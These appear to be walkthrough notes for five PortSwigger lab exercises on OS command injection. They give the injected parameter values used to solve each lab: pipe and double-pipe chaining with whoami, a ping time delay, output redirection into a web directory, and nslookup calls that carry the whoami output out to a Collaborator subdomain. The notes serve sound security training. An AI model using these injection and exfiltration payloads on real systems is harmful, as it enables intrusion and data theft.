## [OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)

 - Browse to a product page and click Check stock with Burp intercepting
 - Find the stock check request in Proxy > HTTP history and send it to Repeater
 - In Repeater, change the storeID parameter value to 1|whoami
 - Send the request — confirm the current username appears in the response to solve the lab


## [Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)

 - Navigate to the feedback form and submit it with Burp intercepting
 - Find the POST /feedback/submit request in Proxy > HTTP history and send it to Repeater
 - Change the email parameter value to x||ping+-c+10+127.0.0.1||
 - Send the request — confirm the response takes ~10 seconds to return, proving blind injection to solve the lab


## [Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)

 Navigate to the feedback form and submit it with Burp intercepting
 Find the POST /feedback/submit request in Proxy > HTTP history and send it to Repeater
 Change the email parameter value to ||whoami>/var/www/images/output.txt||
 Send the request — confirm a normal (non-delayed) response
 Intercept a product image request (or find one in history) and send it to Repeater
 Change the filename parameter value to output.txt
 Send the request — confirm the whoami output appears in the response to solve the lab


## [Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)

- [ ]  Open the lab and navigate to the feedback form
- [ ]  In Burp Suite, turn on Intercept and submit the feedback form
- [ ]  Catch the POST request in Burp Proxy
- [ ]  Send the request to Repeater
- [ ]  Open the Collaborator tab (**Burp > Collaborator**) and copy your payload subdomain
- [ ]  In Repeater, find the `email` parameter and replace its value with:

```
  x||nslookup+x.YOUR-COLLABORATOR-SUBDOMAIN||
```

- [ ]  Send the request
- [ ]  Switch back to the Collaborator tab and click **Poll now**
- [ ]  Confirm a DNS lookup came in — lab solved ✅

**Key concept:** The `||` chains a second command regardless of the first command's result. Since output can't be read directly, `nslookup` triggers an out-of-band DNS request to Burp Collaborator to confirm execution.


## [Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)

**Blind OS Command Injection — Out-of-Band Data Exfiltration**

- [ ]  Open the lab and navigate to the feedback form
- [ ]  Turn on Burp Intercept and submit the feedback form
- [ ]  Catch the POST request and send it to Repeater
- [ ]  Open the **Collaborator** tab and click **Copy to clipboard** to grab your unique subdomain
- [ ]  In Repeater, find the `email` parameter and replace its value with:

```
  ||nslookup+`whoami`.YOUR-COLLABORATOR-SUBDOMAIN||
```

_(note the backticks around `whoami` — these make the shell execute it as a subcommand and use its output as part of the domain)_

- [ ]  Send the request
- [ ]  Switch to the Collaborator tab and click **Poll now** — wait a few seconds and retry if nothing appears yet
- [ ]  In the DNS interaction that comes in, check the **Description** tab — the full domain looked up will be something like `peter-abc123.YOUR-COLLABORATOR-SUBDOMAIN`
- [ ]  Copy the username prefix (e.g. `peter-abc123`) from the subdomain
- [ ]  Submit that username back in the lab to complete it ✅

**Key difference from the previous lab:** instead of just proving injection with a plain `nslookup`, here you embed a subcommand (`` `whoami` ``) so the command's _output_ becomes part of the DNS hostname — tunneling data out through DNS.
